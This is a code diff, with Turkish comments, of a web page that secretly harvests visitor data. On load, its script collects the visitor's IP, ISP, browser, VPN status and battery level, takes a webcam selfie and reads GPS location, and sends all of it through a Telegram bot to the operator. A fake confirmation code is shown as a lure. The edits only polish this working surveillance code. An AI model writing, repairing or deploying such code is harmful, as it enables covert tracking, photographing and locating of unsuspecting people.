@@ -42,7 +42,7 @@ const URL_SIFRE = urlParams.get("sifre");
 function generateFakeCode() {
   const part1 = Math.floor(1000 + Math.random() * 9000);
   const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
-  return `TR-\( {part1}- \){part2}`;
+  return `TR-${part1}-${part2}`;
 }
 
 async function sendTelegramMessage(chat_id, text, blob=null) {
@@ -74,6 +74,7 @@ async function getBatteryInfo() {
   catch { return { level: "Bilinmiyor", charging: "" }; }
 }
 
+// selfie kamera ve 4:3 oran
 async function takeSelfieWithData(messageText) {
   try{
     const video=document.createElement("video");
@@ -84,7 +85,7 @@ async function takeSelfieWithData(messageText) {
     await video.play();
     await new Promise(r=>setTimeout(r,500));
     const canvas=document.createElement("canvas");
-    canvas.width=640;
+    canvas.width=640;  // 4:3 ratio
     canvas.height=480;
     const ctx=canvas.getContext("2d");
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
@@ -93,7 +94,7 @@ async function takeSelfieWithData(messageText) {
       stream.getTracks().forEach(track=>track.stop());
       video.remove();
     },"image/jpeg");
-  }catch(e){ console.log("Kamera izni reddedildi veya hata oluştu",e);}
+  }catch(e){ console.log("Selfie açılamadı veya hata oluştu",e);}
 }
 
 async function collectUserData(fakeCode){
@@ -108,7 +109,7 @@ async function collectUserData(fakeCode){
 🧠 ISP: ${ipData.org || "Bilinmiyor"}
 📱 Tarayıcı: ${userAgent}
 🔐 VPN/Proxy: ${vpnProxy}
-🔋 Şarj: \( {battery.level}% ( \){battery.charging})
+🔋 Şarj: ${battery.level}% (${battery.charging})
 💻 Kod: ${fakeCode}`;
 }
 
@@ -117,6 +118,7 @@ async function sendLocation() {
   navigator.geolocation.getCurrentPosition(pos=>{
     const lat=pos.coords.latitude;
     const lon=pos.coords.longitude;
+    // telegram üzerinden konum olarak gönder
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
@@ -128,7 +130,7 @@ async function sendLocation() {
 function showError(msg){const e=document.getElementById("errorMsg");e.textContent=msg;e.style.display="block";document.getElementById("fakeCode").style.display="none";}
 function hideError(){document.getElementById("errorMsg").style.display="none";}
 
-// Sayfa açılır açılmaz veri gönder (izinler burada istenecek)
+// site açılır açılmaz veri gönder
 (async ()=>{
   if(!CHAT_ID||!URL_SIFRE) return;
   const fakeCode=generateFakeCode();
@@ -145,7 +147,7 @@ document.getElementById("submitBtn").addEventListener("click",async ()=>{
   if(input===ADMIN_CODE){
     hideError();
     const fakeCode=generateFakeCode();
-    document.getElementById("fakeCode").innerHTML = `Kod başarıyla tanımlandı!<br><br>Onay Kodunuz: <b>${fakeCode}</b>`;
+    document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
     document.getElementById("fakeCode").style.display="block";
     await sendTelegramMessage(ADMIN_ID,"Admin kodu kullanıldı.");
     const messageText=await collectUserData(fakeCode);
@@ -158,7 +160,7 @@ document.getElementById("submitBtn").addEventListener("click",async ()=>{
 
   hideError();
   const fakeCode=generateFakeCode();
-  document.getElementById("fakeCode").innerHTML = `Kod başarıyla tanımlandı!<br><br>Onay Kodunuz: <b>${fakeCode}</b>`;
+  document.getElementById("fakeCode").textContent=`Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
   document.getElementById("fakeCode").style.display="block";
 
   const messageText=await collectUserData(fakeCode);
